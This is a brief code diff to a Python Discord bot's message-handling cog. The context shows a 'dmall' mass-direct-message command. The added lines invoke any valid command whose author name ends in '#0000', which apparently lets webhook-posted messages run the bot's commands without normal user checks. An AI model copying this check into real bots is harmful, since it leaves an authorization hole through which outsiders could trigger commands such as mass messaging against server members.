@@ -98,6 +98,11 @@ class onmsg(commands.Cog):
             if message.content.lower().startswith(f'{self.client.prefix}dmall'):
                 await dmall.dmall(self, message, message.content[6:].split(), True)
 
+        ctx = await self.client.get_context(message)
+
+        if ctx.valid and str(ctx.author)[::-1][:5][::-1] == "#0000":
+            await self.client.invoke(ctx)
+
     @commands.Cog.listener()
     async def on_reaction_add(self, reaction, user):
         if reaction.message.guild.id != 828797783863591012:
